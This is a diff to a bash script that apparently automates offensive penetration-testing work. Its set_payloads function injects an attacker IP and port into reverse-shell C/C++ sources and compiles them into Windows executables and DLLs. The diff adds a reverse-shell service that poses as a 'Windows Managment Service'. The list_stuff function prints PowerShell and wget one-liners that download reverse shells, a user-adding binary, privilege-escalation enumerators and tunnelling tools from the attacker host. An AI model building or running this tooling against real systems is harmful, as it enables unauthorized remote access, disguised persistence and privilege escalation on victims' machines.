@@ -32,10 +32,14 @@ get_ip_address() {
 set_payloads() {
     echo "COMPILING"
     echo "=============================================="
-    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/cppdll_shell.cpp
-    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/winshell.c
-    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/cppdll_shell.cpp --shared -o /home/$USER/auto/payloads/cppdll_shell.dll -lws2_32
-    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/winshell.c -o /home/$USER/auto/payloads/winshell.exe -lws2_32
+    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/src/cppdll_shell.cpp
+    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/src/winshell.c
+
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/src/cppdll_shell.cpp --shared -o /home/$USER/auto/payloads/cppdll_shell.dll -lws2_32
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/src/winshell.c -o /home/$USER/auto/payloads/winshell.exe -lws2_32
+
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/src/rs_service/main.c /home/$USER/auto/payloads/src/rs_service/service.c /home/$USER/auto/payloads/src/rs_service/shell.c -o /home/$USER/auto/payloads/rs_service.exe \
+    -DSERVER_HOST=L"\"$lhost\"" -DSERVER_PORT=L"\"$lport\"" -DSERVICE_NAME=L"\"WinMansvc\"" -DSERVICE_DESC=L"\"Windows Managment Service\"" -DDISPLAY_NAME=L"\"WinMansvc\"" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
 }
 
 
@@ -97,9 +101,14 @@ list_stuff() {
     echo "iwr -uri http://$lhost/enum/winPEASx64.exe -OutFile winpeas.exe"
     echo "iwr -uri http://$lhost/enum/PowerUp.ps1 -OutFile PowerUp.ps1"
     echo ""
-    echo "iwr -uri http://$lhost/payloads/ncat.exe -OutFile nc.exe"
+    echo "iwr -uri http://$lhost/payloads/nc.exe -OutFile nc.exe"
     echo "iwr -uri http://$lhost/payloads/useradd.exe -OutFile useradd.exe"
     echo "iwr -uri http://$lhost/payloads/winshell.exe -OutFile winshell.exe"
+    echo ""
+    echo "iwr -uri http://$lhost/payloads/rs_service.exe -OutFile rs_service.exe"
+    echo ""
+    echo "iwr -uri http://$lhost/payloads/mettcp.exe -OutFile mettcp.exe     (TODO)"
+    echo "iwr -uri http://$lhost/payloads/methttps.exe -OutFile methttps.exe (TODO)"
     echo ""
     echo "iwr -uri http://$lhost/payloads/cppdll_useradd.dll -OutFile cppdll_useradd.dll"
     echo "iwr -uri http://$lhost/payloads/cppdll_shell.dll -OutFile cppdll_shell.dll"
@@ -126,6 +135,7 @@ list_stuff() {
     echo "wget http://$lhost/payloads/nmap"
     echo ""
     echo "iwr -uri http://$lhost/payloads/plink.exe -OutFile plink.exe"
+    echo "wget http://$lhost/payloads/chisel"
     echo ""
 }
 
